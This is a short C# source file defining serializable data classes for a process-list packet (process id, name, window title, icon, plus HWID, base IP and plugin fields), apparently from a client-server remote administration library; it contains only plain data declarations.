using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class Proc
    {
        public byte[] processIcon { get; set; }
        public int processId { get; set; }
        public string processName { get; set; }
        public string processWindowTitle { get; set; }
        public string processWindowHandle { get; set; }
        public string is64Bit { get; set; }
    }

    [Serializable]
    public class ProcessManagerPacket : IPacket
    {
        public ProcessManagerPacket() : base() 
        {
            this.packetType = PacketType.PM_GET_PROCESSES;
        }

        public ProcessManagerPacket(List<Proc> processes, string baseIp, string HWID) : base()
        {
          
            packetType = PacketType.PM_GET_PROCESSES;
            this.baseIp = baseIp;
            this.HWID = HWID;  
            
            this.processes = processes;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public List<Proc> processes { get; set; }
    }
}
